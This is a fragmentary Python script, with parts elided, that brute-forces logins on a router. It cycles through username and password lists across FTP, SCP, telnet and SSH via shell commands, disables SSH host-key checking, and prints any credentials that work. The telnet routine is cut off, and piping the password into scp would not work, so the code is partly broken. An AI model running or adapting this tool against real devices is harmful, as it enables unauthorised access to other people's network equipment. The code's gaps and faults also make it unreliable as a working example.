...
# Define the IP address of the router
...
# Function to attempt FTP access
def try_ftp(username, password):
    command = f"ftp -inv {router_ip_address} << EOF\nuser {username}\n{password}\nEOF"
    output = os.system(command)
    if output == 0:
        print(f"FTP access successful with username '{username}' and password '{password}'")
        return True
    else:
        return False

# Function to attempt SCP access
def try_scp(username, password):
    command = f"scp -o StrictHostKeyChecking=no {username}@{router_ip_address}:~/file.txt /dev/null"
    output = os.system(f"echo {password} | {command}")
    if output == 0:
        print(f"SCP access successful with username '{username}' and password '{password}'")
        return True
    else:
        return False
...
def try_telnet(username, password):
    command = f"telnet {router_ip_address}"
...
def try_ssh(username, password):
    command = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{router_ip_address} 'exit'"
    output = os.system(command)
    if output == 0:
...
for username in usernames:
    for password in passwords:
        ...
        if try_ftp(username, password) or try_scp(username, password) or try_telnet(username, password) or try_ssh(username, password):
